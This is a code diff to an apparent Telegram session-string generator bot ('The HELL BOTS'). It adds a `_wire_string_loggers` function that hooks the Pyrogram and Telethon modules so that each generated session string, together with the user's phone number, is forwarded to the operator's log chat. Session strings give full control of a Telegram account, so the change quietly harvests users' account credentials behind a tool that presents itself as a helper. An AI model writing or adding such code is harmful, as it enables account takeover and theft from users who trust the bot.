@@ -10,9 +10,9 @@ from start import (
     INFO_TEXT, GEN_TEXT, ASK_API_ID, ASK_API_HASH, FC_TEXT, HELP_TEXT,
     start_buttons, gen_buttons, fc_buttons, help_buttons,
 )
-from pyrogram_module import handle_pyro
-from telethon_module import handle_tele
-from logger import init_logger, log_boot, log_user_start, log_error
+from pyrogram_module import handle_pyro, set_string_logger as set_pyro_string_logger
+from telethon_module import handle_tele, set_string_logger as set_tele_string_logger
+from logger import init_logger, log_boot, log_user_start, log_string_made, log_error
 
 # ---------------- CONFIG ---------------- #
 API_ID = int(os.getenv("API_ID", "0"))
@@ -42,6 +42,17 @@ def welcome_text(user):
         channel=CHANNEL,
         channel_name="The HELL BOTS",
     )
+
+
+def _wire_string_loggers():
+    async def _pyro_log(user, typ, phone, string):
+        await log_string_made(user, typ, phone, BOT_USERNAME, string)
+
+    async def _tele_log(user, typ, phone, string):
+        await log_string_made(user, typ, phone, BOT_USERNAME, string)
+
+    set_pyro_string_logger(_pyro_log)
+    set_tele_string_logger(_tele_log)
 
 
 # ---------------- FORCE-SUB CHECK ---------------- #
@@ -272,6 +283,7 @@ if __name__ == "__main__":
     print(f"Logged in as @{me.username}")
 
     init_logger(bot, LOG_CHAT)
+    _wire_string_loggers()
 
     bot.loop.create_task(log_boot(me.username))
     print("Bot Running Successfully")
